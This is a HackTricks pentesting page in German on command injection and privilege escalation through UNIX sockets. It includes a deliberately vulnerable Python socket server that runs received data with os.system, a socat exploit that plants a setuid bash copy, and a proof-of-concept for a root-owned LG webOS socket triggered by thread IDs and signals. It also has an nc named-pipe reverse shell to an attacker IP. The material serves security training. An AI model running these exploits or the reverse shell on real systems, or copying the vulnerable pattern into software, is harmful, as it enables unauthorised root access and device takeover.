# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding example with Python

Im folgenden Beispiel wird ein **unix socket** (`/tmp/socket_test.s`) erstellt und alles, was **empfangen** wird, von `os.system` **ausgeführt**. Ich weiß, dass du so etwas in freier Wildbahn wahrscheinlich nicht finden wirst, aber das Ziel dieses Beispiels ist zu zeigen, wie Code aussieht, der unix sockets verwendet, und wie man die Eingabe im schlimmstmöglichen Fall handhabt.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Führe** den Code mit python aus: `python s.py` und **prüfe, wie der socket lauscht**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Fallstudie: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Einige privilegierte Daemons öffnen einen root-owned UNIX socket, der untrusted input akzeptiert und privilegierte Aktionen an thread-IDs und signals koppelt. Wenn das Protokoll einem nicht-privilegierten Client erlaubt zu beeinflussen, welcher native Thread das Ziel ist, kann man möglicherweise einen privilegierten Codepfad auslösen und Privilegien erlangen.

Beobachtetes Muster:
- Mit einem root-owned Socket verbinden (z. B. /tmp/remotelogger).
- Einen Thread erstellen und dessen native thread id (TID) ermitteln.
- Die TID (packed) plus Padding als Request senden; eine Bestätigung erhalten.
- Ein bestimmtes signal an diese TID senden, um das privilegierte Verhalten auszulösen.

Minimale PoC-Skizze:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Um dies in eine root shell zu verwandeln, kann ein einfaches named-pipe + nc-Muster verwendet werden:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Hinweise:
- Diese Klasse von Bugs entsteht dadurch, dass Werten vertraut wird, die aus unprivilegiertem Client-Status (TIDs) abgeleitet sind, und diese an privilegierte Signal-Handler oder Logik gebunden werden.
- Absichern durch Erzwingen von credentials auf dem socket, Validierung von Nachrichtenformaten und Entkopplung privilegierter Operationen von extern gelieferten Thread-Identifikatoren.

## Referenzen

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
